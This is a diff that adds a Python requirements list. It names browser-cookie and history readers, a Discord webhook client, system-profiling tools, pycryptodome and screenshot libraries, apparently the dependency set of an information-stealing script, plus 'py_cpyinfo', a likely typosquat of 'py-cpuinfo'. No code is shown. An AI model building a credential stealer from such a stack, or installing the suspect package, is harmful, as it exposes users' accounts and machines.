@@ -1,0 +1,13 @@
+browser_cookie3
+browser_history
+discord_webhook
+getmac
+prettytable
+psutil
+py_cpyinfo
+pycountry
+pycryptodome
+pywin32
+requests
+pyautogui
+Pillow
